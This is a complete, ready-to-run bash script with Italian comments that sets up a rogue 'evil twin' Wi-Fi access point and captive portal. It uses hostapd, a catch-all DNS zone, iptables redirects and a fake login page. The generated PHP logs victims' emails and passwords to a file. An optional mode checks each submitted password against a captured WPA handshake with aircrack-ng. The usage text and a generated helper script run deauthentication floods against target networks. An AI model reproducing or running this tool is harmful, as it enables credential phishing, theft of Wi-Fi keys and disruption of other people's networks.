#!/bin/bash
# SCRIPT DEPENDENCIES:		iptables psmisc net-tools aircrack-ng bind9 hostapd isc-dhcp-server
# WEB DEPENDENCIES:			apache2 php5 libapache2-mod-php5 

# apt install iptables psmisc net-tools aircrack-ng bind9 hostapd isc-dhcp-server apache2 php5 libapache2-mod-php5
# ./captive_portal.sh -i wlan0 -c 1 -s TEST -m et_aggiornamento/_generic start 

# TODO:	Semplificare l'operazione

#Generali
interfaccia=wlan0
sleep_time=1
autocheck_stop_delay=10

#Modulo Web
modulo_web="et_aggiornamento/_generic"

#Rete Hostata
ssid="HOTSPOT"
bssid=00:AA:11:BB:22:CC
canale=6
hidessid=0						#Nascondi SSID
wpa=0							#3=ON 0=OFF
wpa_passphrase="password"		#Almeno 8 char
handshake=""

#Network
default_gateway="192.168.0.1"
fake_dns_resp="8.8.8.8"
main_page="auth.html"
land_page="updating.html"
error_page="error.html"

###########################################################

if [ "$(id -u)" != "0" ]; then
   echo "[!] This script must be run as root."
   exit 1
fi

###########################################################

function fx_check_dependencies {

	missing=""
	dep=('iptables' 'php' 'psmisc' 'net-tools' 'aircrack-ng' 'bind9' 'hostapd' 'isc-dhcp-server' 'apache2') #php5 libapache2-mod-php5)

	t=$(/usr/bin/dpkg -s aircrack-ng &> /dev/null; echo $?)


	for (( j=0; j<${#dep[@]}; j++ )); do
		t=$(/usr/bin/dpkg -s ${dep[j]} &> /dev/null; echo $?)
		if [ "$t" -ne 0 ]; then
			echo -e "[!] ${dep[j]} Not installed"
			missing="$missing ${dep[j]}"
		else
			echo -e "[*] ${dep[j]} Installed"

		fi

	done


	if [ ! -z "$missing" ]; then
		echo
		echo "[!] Missing dependencies, please do:"; echo
		echo "    apt-get update; apt-get install $missing -y"
		exit 1
	fi
	

}

###########################################################

function fx_reset_network {
	killall dhcpd
	killall hostapd
	airmon-ng check kill
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT
	iptables -P FORWARD ACCEPT
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
}

###########################################################

function fx_backup_config {

	if [ -d "backup/" ]; then
		echo "[!] Error, you have to restore a pending backup, try:"
		echo "    ./captive_portal.sh stop"
		exit 1
	
	else

		mkdir backup/
		
		cp /etc/apache2/sites-available/000-default.conf backup/
		cp /etc/apache2/sites-available/default-ssl.conf backup/
		cp /etc/apache2/ports.conf backup/

		cp /etc/bind/named.conf backup/

		iptables-save > backup/iptables_config.txt

		chmod 000 backup/

	fi

}


function fx_restore_config {

	if [ -d "backup/" ]; then

		chmod 755 backup/

		rm -f /etc/apache2/sites-available/000-default.conf
		cp backup/000-default.conf /etc/apache2/sites-available/000-default.conf
		rm -f /etc/apache2/sites-enabled/000-default.conf
		ln -s /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-enabled/
		
		rm -f /etc/apache2/sites-available/default-ssl.conf
		cp backup/default-ssl.conf /etc/apache2/sites-available/default-ssl.conf
		rm -f /etc/apache2/sites-enabled/default-ssl.conf
		ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/

		cp backup/ports.conf /etc/apache2/ports.conf

		rm -rf /var/lib/dhcp
		rm -f /var/run/dhcpd.pid

		cp backup/named.conf /etc/bind/named.conf
		rm -rf /etc/namedb/

		iptables-restore < backup/iptables_config.txt

		cat /var/www/captive_portal/users.txt >> database.txt
		rm -rf /var/www/captive_portal
		rm -rf backup/
		rm -rf /etc/apache2/captive_portal_ssl

	else

		echo "[!] NO BACKUP FOLDER AVAILABLE, backup may have been lost."
		echo "    Check the problem manually."

	fi

}


function fx_captive_start {
###########################################################

#old_data=$(cat /var/www/captive_portal/users.txt)
#fx_reset_network
fx_backup_config

mkdir running/

###########################################################

a2enmod ssl 								# SSL config
mkdir /etc/apache2/captive_portal_ssl 		# SSL config

# SSL config

if [ -f "/etc/apache2/captive_portal_ssl/apache.pem" ] || [ -f "/etc/apache2/captive_portal_ssl/apache.key" ]; then
	echo "[*] Using existent ssl certificates"
else
	echo "[*] Ssl certificates not found, creating it..."
	rm -f /etc/apache2/captive_portal_ssl/apache.pem
	rm -f /etc/apache2/captive_portal_ssl/apache.key
	openssl req -new -x509 -days 365 -nodes -out /etc/apache2/captive_portal_ssl/apache.pem -keyout /etc/apache2/captive_portal_ssl/apache.key -subj "/C=NL/ST=user/L=Rotterdam/O=Network/OU=IT Department/CN=ssl.net.org"
fi


(echo '<VirtualHost *:8000>
	ServerAdmin *

	DocumentRoot /var/www/captive_portal
	
	ErrorDocument 404 /index.php
	ErrorDocument 500 /index.php
	ErrorDocument 503 /index.php

	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory /var/www/captive_portal>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
		AllowOverride None
		Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
		Order allow,deny
		Allow from all
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log

	# Possible values include: debug, info, notice, warn, error, crit,
	# alert, emerg.
	LogLevel warn

	CustomLog ${APACHE_LOG_DIR}/access.log combined

	Alias /doc/ "/usr/share/doc/"
	<Directory "/usr/share/doc/">
		Options Indexes MultiViews FollowSymLinks
		AllowOverride None
		Order deny,allow
		Deny from all
		Allow from 127.0.0.0/255.0.0.0 ::1/128
	</Directory>

</VirtualHost>') > /etc/apache2/sites-available/000-default.conf



(echo '<IfModule mod_ssl.c>
	<VirtualHost *:443>
		ServerAdmin *
		DocumentRoot /var/www/captive_portal

		ErrorDocument 404 /index.php
		ErrorDocument 500 /index.php
		ErrorDocument 503 /index.php
		
		ErrorLog ${APACHE_LOG_DIR}/error.log
		CustomLog ${APACHE_LOG_DIR}/access.log combined

		SSLEngine on

		SSLCertificateFile	/etc/apache2/captive_portal_ssl/apache.pem
		SSLCertificateKeyFile /etc/apache2/captive_portal_ssl/apache.key

		
		<FilesMatch "\.(cgi|shtml|phtml|php)$">
				SSLOptions +StdEnvVars
		</FilesMatch>
		<Directory /usr/lib/cgi-bin>
				SSLOptions +StdEnvVars
		</Directory>
		

	</VirtualHost>
</IfModule>') > /etc/apache2/sites-available/default-ssl.conf 		# SSL config



(echo '# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 8000

<IfModule ssl_module>
	Listen 443
</IfModule>

#<IfModule mod_ssl.c>
#    # If you add NameVirtualHost *:443 here, you will also have to change
#    # the VirtualHost statement in /etc/apache2/sites-available/default-ssl
#    # to <VirtualHost *:443>
#    # Server Name Indication for SSL named virtual hosts is currently not
#    # supported by MSIE on Windows XP.
#    NameVirtualHost *:443
#    Listen 443
#</IfModule>

#<IfModule mod_gnutls.c>
#    Listen 443
#</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet') > /etc/apache2/ports.conf


rm -f /etc/apache2/sites-enabled/000-default.conf
ln -s /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-enabled/

rm -f /etc/apache2/sites-enabled/default-ssl.conf
ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/

rm -rf /var/www/captive_portal
mkdir /var/www/captive_portal
cp -r ap_module/$modulo_web/* /var/www/captive_portal/
cp -r ap_module/_bootstrap/* /var/www/captive_portal/


(echo "<?php
http_response_code(302);
header(\"Location:http://$default_gateway/$main_page\");
exit();
?>") > /var/www/captive_portal/index.php


if [ -z "$handshake" ]; then

	(echo "<?php
\$a = \$_REQUEST[\"email\"];
\$b = \$_REQUEST[\"pass\"];
\$c = date(\"H:i:s\");

//the data
\$data = \"\r\n\$c  |  \" . get_client_ip() . \"  |  \$a  |  \$b  \";

//open the file and choose the mode
\$fh = fopen(\"users.txt\", \"a\");
fwrite(\$fh, \$data);

//close the file
fclose(\$fh);

header(\"location:$land_page\");

function get_client_ip() {
	\$ipaddress = '';
	if (getenv('HTTP_CLIENT_IP'))
		\$ipaddress = getenv('HTTP_CLIENT_IP');
	else if(getenv('HTTP_X_FORWARDED_FOR'))
		\$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
	else if(getenv('HTTP_X_FORWARDED'))
		\$ipaddress = getenv('HTTP_X_FORWARDED');
	else if(getenv('HTTP_FORWARDED_FOR'))
		\$ipaddress = getenv('HTTP_FORWARDED_FOR');
	else if(getenv('HTTP_FORWARDED'))
	   \$ipaddress = getenv('HTTP_FORWARDED');
	else if(getenv('REMOTE_ADDR'))
		\$ipaddress = getenv('REMOTE_ADDR');
	else
		\$ipaddress = 'UNKNOWN';
	return \$ipaddress;
}
?>")  > /var/www/captive_portal/login.php

	touch /var/www/captive_portal/users.txt
	chmod 777 /var/www/captive_portal/* -R
	chmod 666 /var/www/captive_portal/users.txt

else

	(echo "<?php
\$a = \$_REQUEST[\"email\"];
\$b = \$_REQUEST[\"pass\"];
\$c = date(\"H:i:s\");


if(\$a == \$b){
	\$fh = fopen(\"candidate_pass.txt\", \"a\");
	fwrite(\$fh, \"\r\n\$a\r\n\$b\");
	fclose(\$fh);

	sleep(3);

	if (file_get_contents( \"found.txt\" ) == 1){
		\$data = \"\r\n\$c  |  \" . get_client_ip() . \"  |  \$a  |  \$b  |  SUCCESS\";
		\$fh = fopen(\"users.txt\", \"a\");
		fwrite(\$fh, \$data);
		fclose(\$fh);

		header(\"location:$land_page\");

	} else {
		\$data = \"\r\n\$c  |  \" . get_client_ip() . \"  |  \$a  |  \$b  |  FAILED\";
		\$fh = fopen(\"users.txt\", \"a\");
		fwrite(\$fh, \$data);
		fclose(\$fh);

		header(\"location:$error_page\");
	}


} else {
	
	\$data = \"\r\n\$c  |  \" . get_client_ip() . \"  |  \$a  |  \$b  |  FAILED\";
	\$fh = fopen(\"users.txt\", \"a\");
	fwrite(\$fh, \$data);
	fclose(\$fh);

	header(\"location:$error_page\");
}




function get_client_ip() {
	\$ipaddress = '';
	if (getenv('HTTP_CLIENT_IP'))
		\$ipaddress = getenv('HTTP_CLIENT_IP');
	else if(getenv('HTTP_X_FORWARDED_FOR'))
		\$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
	else if(getenv('HTTP_X_FORWARDED'))
		\$ipaddress = getenv('HTTP_X_FORWARDED');
	else if(getenv('HTTP_FORWARDED_FOR'))
		\$ipaddress = getenv('HTTP_FORWARDED_FOR');
	else if(getenv('HTTP_FORWARDED'))
	   \$ipaddress = getenv('HTTP_FORWARDED');
	else if(getenv('REMOTE_ADDR'))
		\$ipaddress = getenv('REMOTE_ADDR');
	else
		\$ipaddress = 'UNKNOWN';
	return \$ipaddress;
}
?>")  > /var/www/captive_portal/login.php

	touch /var/www/captive_portal/users.txt
	touch /var/www/captive_portal/candidate_pass.txt
	touch /var/www/captive_portal/found.txt
	echo "0" > /var/www/captive_portal/found.txt
	chmod 777 /var/www/captive_portal/* -R
	chmod 666 /var/www/captive_portal/users.txt
	chmod 666 /var/www/captive_portal/candidate_pass.txt
	chmod 666 /var/www/captive_portal/found.txt

fi

a2ensite default-ssl				# SSL config
service apache2 reload				# SSL config

/etc/init.d/apache2 stop
/etc/init.d/apache2 start
#/etc/init.d/apache2 restart

###########################################################


(echo "interface=$interfaccia
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$canale
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=$hidessid
wpa=$wpa
wpa_passphrase=$wpa_passphrase
wpa_pairwise=TKIP
rsn_pairwise=CCMP") > running/hostpad-conf.conf


counter=0
while [[ -z "$running" && $counter -lt "5" ]]; do

	echo "[*] Launching hostapd (attempt $counter)"

	sleep 1
	ifconfig $interface down
	ifconfig $interface up
	
	killall hostapd
	hostapd running/hostpad-conf.conf -B #>/dev/null &

	running=$(ps cax | grep hostapd)
	counter=$((counter+1))

done

#rm -f hostpad-conf.conf


###########################################################


mkdir /var/lib/dhcp
touch /var/lib/dhcp/dhcpd.leases

ifconfig $interfaccia  up
ifconfig $interfaccia  192.168.0.1 netmask 255.255.255.0

touch /var/run/dhcpd.pid
chmod +x /var/run/dhcpd.pid

(echo "authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.0.0 netmask 255.255.255.0 {
		option subnet-mask 255.255.255.0;
		option broadcast-address 192.168.0.255;
		option routers 192.168.0.1;
		option domain-name-servers 192.168.0.1; #DNS SERVER
		range 192.168.0.2 192.168.0.202;
}") > running/dhcpd-conf.conf

dhcpd -q -cf running/dhcpd-conf.conf $interfaccia #> /dev/null &

#rm -f dhcpd-conf.conf


###########################################################

(echo 'options {
	directory	"/etc/namedb";
	pid-file	"/var/run/named/pid";
	allow-query	{ any; };
	allow-recursion	{ any; };
};


zone "." {
	type master;
	file "/etc/namedb/db.catchall";
};') > /etc/bind/named.conf

#---------------------------------------------------------#

rm -rf /etc/namedb/
mkdir -p /etc/namedb/

(echo "$""TTL    604800
@       IN      SOA     . root.localhost. (
							  1         ; Serial
						 604800         ; Refresh
						  86400         ; Retry
						2419200         ; Expire
						 604800 )       ; Negative Cache TTL

	IN	NS	.
.	IN	A	$fake_dns_resp
*.	IN	A	$fake_dns_resp") > /etc/namedb/db.catchall

/etc/init.d/bind9 stop
/etc/init.d/bind9 start
#/etc/init.d/bind9 restart

###########################################################

(echo "
import socket
import time
import os
import sys
import thread
from threading import Thread

def responder(conn, addr, response):
	request = conn.recv(1024*32)
	#print addr
	#print request

	print '[*] Responding at: ' + str(addr)

	conn.sendall(response)
	conn.close()


captive = '''\
HTTP/1.0 302 Redirect
Server: OpenRG
Content-Type: text/html
Location: http://$default_gateway:8000/$main_page
Connection: close

<!DOCTYPE html>
<html>
	<br>
</html>
'''

cp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
cp.bind(('0.0.0.0', 80))
cp.listen(1)
print '[*] Captive portal hosted'

while True:
	try:
		conn, addr = cp.accept()
		thread.start_new_thread ( responder, (conn, addr, captive))
	except:
		print '[!] Error while responding...'

") > running/captive_responder.py

#xterm -e "running/python captive_responder.py" &
python running/captive_responder.py > /dev/null &
echo "$!" > "/tmp/captive_responder_pid"

###########################################################

if [ ! -z "$handshake" ]; then

	(echo "filename=\"/var/www/captive_portal/candidate_pass.txt\"
cap_file=\"$handshake\"
size_1=0
size_2=\$(wc -c < \$filename)

while [[ true ]]; do
	
	size_2=\$(wc -c < \$filename)

	if [[ \$size_1 -ne \$size_2  ]]; then
		
		#aircrack-ng \"\$cap_file\" -w \"\$filename\" | grep \"KEY\" | awk '{print \$4}' > key.txt
		#aircrack-ng \"\$cap_file\" -w \"\$filename\"

		if ! aircrack-ng -w \"\$filename\" \"\$cap_file\" | grep \"KEY FOUND!\"; then
			echo \"0\">/var/www/captive_portal/found.txt

		else
			echo \"1\">/var/www/captive_portal/found.txt
		fi

		chmod 666 /var/www/captive_portal/found.txt
		size_1=\$size_2

	else
		sleep 1
	fi

done") > running/captive_handshake_check.sh

	chmod +x running/captive_handshake_check.sh
	bash running/captive_handshake_check.sh > /dev/null &
	echo "$!" > "/tmp/captive_handshake_check_pid"

fi

###########################################################

iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 80 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 443 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 8000 -j ACCEPT
iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --dport 8000 -j ACCEPT

iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 8000 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --sport 443 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --sport 8000 -j ACCEPT

iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $default_gateway:53
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $default_gateway:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $default_gateway:443
iptables -t nat -A PREROUTING -p tcp --dport 8000 -j DNAT --to-destination $default_gateway:8000

# Only for rpi-ssh
iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

iptables -A INPUT -i $interfaccia -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o $interfaccia -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT

###########################################################
echo
echo "###########################################################"
echo "#                      Started                            #"
echo "###########################################################"
} # END OF CAPTIVE START
###########################################################

function fx_captive_stop {
	new_data=$(cat /var/www/captive_portal/users.txt)

	fx_reset_network
	fx_restore_config

	/etc/init.d/apache2 stop
	/etc/init.d/bind9 stop

	#responder_pid=$(cat /tmp/captive_responder_pid)			# Kill responder
	#echo $responder_pid
	#kill $responder_pid
	#rm -f /tmp/captive_responder_pid

	#hcheck_pid=$(cat /tmp/captive_handshake_check_pid)		# Kill checker
	#echo $hcheck_pid
	#kill $hcheck_pid
	#rm -f /tmp/captive_handshake_check_pid

	echo

	if [ -f "/tmp/captive_responder_pid" ]; then
		responder_pid=$(cat /tmp/captive_responder_pid)
		kill $responder_pid
		if [ "$?" -eq 0 ]; then 
			echo "[*] Killed captive_responder (PID: $responder_pid)"
		else
			echo "[!] Error killing captive_responder (No PID found)"
		fi
		rm -f /tmp/captive_responder_pid
	else
		echo "[!] Error killing captive_responder (/tmp/captive_responder_pid not found)"
	fi


	if [ -f "/tmp/captive_handshake_check_pid" ]; then
		hcheck_pid=$(cat /tmp/captive_handshake_check_pid)
		kill $hcheck_pid
		if [ "$?" -eq 0 ]; then 
			echo "[*] Killed captive_handshake_check (PID: $hcheck_pid)"
		else
			echo "[!] Error killing captive_handshake_check (No PID found)"
		fi
		rm -f /tmp/captive_handshake_check_pid
	else
		echo "[!] Error killing captive_handshake_check (/tmp/captive_handshake_check_pid not found)"
	fi

	rm -rf running/											# Delete running folder

	service network-manager start

	echo
	echo "###########################################################"
	echo "#  Showing data gathered with the script...               #"
	echo "###########################################################"
	echo

	echo $new_data

###########################################################
} # END OF CAPTIVE STOP


#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#

function fx_usage { 
	echo "Usage: $0 [Options] [Mode]"
	echo
	echo "OPTIONS:"
	echo "  -i       interface"
	echo "  -c       channel"
	echo "  -s       ssid"
	echo "  -m       module"
	echo "  -p       password (not required)"
	echo "  -a       handshake (not required)"
	echo
	echo "MODES:"
	echo "  list       list all modules available"
	echo "  start      start the captive_portal"
	echo "  stop       stop the captive_portal"
	echo "  check      check users.txt and lease file"
	echo "  autocheck  same as check, but stops the script when password is captured"
	echo "  script     generate a script"
	echo "  restore    restore the precedent backup"
	echo 
	echo "EXAMPLE: "
	echo "   ./captive_portal.sh -i wlan0 -c 1 -s TEST -m et_aggiornamento/_generic start"
	echo
	echo "HOW TO GRAB HANDSHAKE:"
	echo "   airmon-ng check kill; airmon-ng start <interface>"
	echo "   airodump-ng -c <channel> --bssid <bssid> --showack -w WPA <inteface>"
	echo "   aireplay-ng --deauth 100 -a <bssid> <inteface>"
	echo
	echo "   Your handshake file will be: WPA*.cap it can by checked by:"
	echo "   pyrit -r <handshake> analyze"
	echo 
	exit 1
}


while getopts ":i:c:s:m:p:a:h:" x; do
	case "${x}" in
		i)
			i=${OPTARG}
			;;
		c)
			c=${OPTARG}
			;;
		s)
			s=${OPTARG}
			;;
		m)
			m=${OPTARG}
			;;
		p)
			p=${OPTARG}
			;;
		a)
			a=${OPTARG}
			;;
		*)
			#fx_usage
			;;
	esac
done
shift $((OPTIND-1))

if [ -z "$1" ]; then
	echo "[!] MODE REQUIRED"; echo
	fx_usage
	exit 1
fi

###########################################################

if [ "$1" == "list" ]; then

	echo
	echo "[*] Available modules: "
	echo
	find ap_module/ -maxdepth 2 -type d -not -path "*_bootstrap*" -not -path "ap_module/" -print | cut -d"/" -f 2-
	echo
	echo
	exit 0
	
fi

###########################################################

if [ "$1" == "start" ]; then

	if [ -f "/tmp/captive_responder_pid" ] || [ -f "running/" ]; then
		echo "[!] Script already running, try: "
		echo "    ./captive_portal.sh stop"
		exit 1

	elif [ -z "${i}" ] || [ -z "${c}" ] || [ -z "${s}" ] || [ -z "${m}" ]; then
		echo "[!] i, c, s, m, need to be set"; echo
		fx_usage
		exit 1
	
	
	elif [[ ! -d "/sys/class/net/${i}" ]]; then
		echo "[!] INTERFACE: ${i} Not found or not up."; echo
		exit 1


	elif [ ! -d "ap_module/${m}" ]; then
		echo "[!] MODULE ${m} NOT FOUND."; echo
		exit 1

	else

		fx_check_dependencies

		interfaccia=${i}
		sleep_time=1
		modulo_web=${m}
		ssid=${s}
		bssid="00:AA:11:BB:22:CC"
		canale=${c}
		hidessid=0

		if [ -z "${p}" ]; then
			wpa=0
			wpa_passphrase="password"
		else
			wpa=3
			wpa_passphrase=${p}
		fi


		if [ -z "${a}" ]; then
			handshake=""
		else
			handshake=${a}

			if [ ! -f "$handshake" ]; then
				echo "[!] HANDSHAKE ${handshake} NOT FOUND."; echo
				exit 1
			fi
		fi



		echo
		echo "Interfaccia: $interfaccia"
		echo "Canale:      $canale"
		echo "Essid:       $ssid"
		echo "Bssid:       $bssid"
		echo "Modulo_Web:  $modulo_web"
		echo "Wpa:         $wpa"
		echo "Password:    $wpa_passphrase"
		echo "Handshake:   $handshake"
		echo

		fx_reset_network
		fx_captive_start

		exit 0

	fi

fi

###########################################################

if [ "$1" == "stop" ]; then
	if [ ! -f "/tmp/captive_responder_pid" ]; then
		res=1
	else 
		res=0
	fi

	fx_captive_stop
	
	if [ "$res" == "1" ]; then

		echo
		echo "###########################################################"
		echo "# Stopped, but no pid found for captive_portal.py         #"
		echo "###########################################################"
		exit 0
	else
		echo
		echo "###########################################################"
		echo "#                      Stopped                            #"
		echo "###########################################################"
		exit 0
	fi
fi

###########################################################

if [ "$1" == "check" ]; then
	if [ -f "/tmp/captive_responder_pid" ]; then
		cont=0
		while true
			do
			cont=$((cont + 1))
			lease_list=($(dhcp-lease-list --parsable | grep "192.168" | awk '{print  $2"__"$4"__"$6}'))
			clear
			echo " CHECK - Time ($cont sec.)"
			echo "#########################"
			echo "# Dhcp:                 #"
			echo "#########################"
			#cat /var/lib/dhcp/dhcpd.leases | grep "lease 192" | cut -d " " -f 2
			for i in ${lease_list[@]}; do echo -e $i; done
			echo
			echo "#########################"
			echo "# Data                  #"
			echo "#########################"
			cat /var/www/captive_portal/users.txt 
			echo
			echo "#########################"
			echo "(ctrl+c to stop)"
			sleep 1
		done
	else
		echo "[!] Captive Portal not running."
		exit 1
	fi
fi



if [ "$1" == "autocheck" ]; then
	if [ -f "/tmp/captive_responder_pid" ]; then
		if [ -f "/tmp/captive_handshake_check_pid" ]; then
			cont=0
			while true
				do
				cont=$((cont + 1))
				lease_list=($(dhcp-lease-list --parsable | grep "192.168" | awk '{print  $2"__"$4"__"$6}'))
				clear
				echo " AUTOCHECK - Time ($cont sec.)"
				echo "#########################"
				echo "# Dhcp:                 #"
				echo "#########################"
				#cat /var/lib/dhcp/dhcpd.leases | grep "lease 192" | cut -d " " -f 2
				for i in ${lease_list[@]}; do echo -e $i; done
				echo
				echo "#########################"
				echo "# Data                  #"
				echo "#########################"
				cat /var/www/captive_portal/users.txt 
				echo
				echo "#########################"
				echo "(ctrl+c to stop)"
				sleep 1

				found_status=$(cat /var/www/captive_portal/found.txt)
				users_status=$(cat /var/www/captive_portal/users.txt | grep "SUCCESS")
				if [[ "$found_status" -eq 1 ]] && [[ "$users_status" ]]; then

					echo; echo
					echo "[*] Password Found"
					tail -2 /var/www/captive_portal/users.txt
					echo; echo

					echo "[*] Waiting $autocheck_stop_delay seconds before stopping..."
					sleep $autocheck_stop_delay

					echo "[*] Stopping captive portal..."
					fx_captive_stop
					echo
					echo "###########################################################"
					echo "#                      Stopped                            #"
					echo "###########################################################"
					break
					exit 0
				fi

			done
		else
			echo "[!] Captive Portal is running, but no handshake was provided."
			echo "    (/tmp/captive_handshake_check_pid no found)"
			exit 1
		fi
	else
		echo "[!] Captive Portal is not running."
		echo "    (/tmp/captive_responder_pid no found)"
		exit 1
	fi
fi

###########################################################

if [ "$1" == "script" ]; then

printf "[?] Script name: "; read script_name

(echo '#!/bin/bash
interface=""
channel=""
ssid=""
module=""
password=""

interface_24=""		# interface for 2,5ghz target
bssid_24=""			# bssid for 2,5ghz target
channel_24=""		# channel for 2,5ghz target
ssid_24=""	    	# ssid for 2,5ghz target

interface_50=""		# interface for 5ghz target
bssid_50=""			# bssid for 5ghz target
channel_50=""		# channel for 5ghz target
ssid_50=""			# ssid for 5ghz target

########################################################################################
# DO NOT TOUCH FROM HERE
########################################################################################


bash captive_portal.sh -i "$interface" -c "$channel" -s "$ssid" -m "$module" start

if [[ ! -z "$interface_24" ]]; then
	airmon-ng check kill
	airmong-ng stop $interface_24mon
	airmong-ng start $interface_24 $channel_24

	aireplay-ng -0 0 -a "$bssid_24" "$interface_24mon" &> /dev/null &
	echo "[*] Deauth started on $bssid_24 (2,4ghz)"

fi

if [[ ! -z "$interface_50" ]]; then
	airmon-ng check kill
	airmong-ng stop $interface_50mon
	airmong-ng start $interface_50 $channel_50

	aireplay-ng -0 0 -a "$bssid_50" "$interface_50mon" &> /dev/null &
	echo "[*] Deauth started on $bssid_50 (5,0ghz)"

fi

echo "[*] All done."') > $script_name

chmod +x $script_name
echo "[*] Script wrote, check variables before running it."
exit 0

fi

#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!#

exit 1